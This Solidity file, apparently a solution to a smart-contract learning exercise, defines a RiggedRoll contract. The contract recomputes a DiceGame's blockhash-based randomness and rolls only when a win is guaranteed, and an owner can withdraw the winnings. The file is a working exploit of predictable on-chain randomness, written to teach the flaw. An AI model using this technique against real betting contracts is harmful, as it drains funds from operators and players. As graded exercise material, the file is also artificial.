pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

error RiggedRoll__NoEnoughEther();
error RiggedRoll__LostRoll(uint256 roll);
error RiggedRoll__WithdrawMoneyFailed();

contract RiggedRoll is Ownable {
	DiceGame public diceGame;

	constructor(address payable diceGameAddress) {
		diceGame = DiceGame(diceGameAddress);
	}

	// Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
    function withdraw(address _add, uint256 amount) public payable onlyOwner {
        (bool success, ) = _add.call{ value: amount }("");
        if (!success) {
            revert RiggedRoll__WithdrawMoneyFailed();
        }
    }

	// Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
	function riggedRoll() public payable {
		if (address(this).balance < 0.002 ether) {
			revert RiggedRoll__NoEnoughEther();
		}
		bytes32 prevHash = blockhash(block.number - 1);
		bytes32 hash = keccak256(
			abi.encodePacked(
				prevHash,
				address(diceGame),
				diceGame.nonce()
			)
		);
		uint256 roll = uint256(hash) % 16;
		if (roll <= 5) {
			diceGame.rollTheDice{ value: 0.002 ether }();
            return;
		}
        revert RiggedRoll__LostRoll(roll);
	}

	// Include the `receive()` function to enable the contract to receive incoming Ether.
	receive() external payable {}

	fallback() external payable {}
}
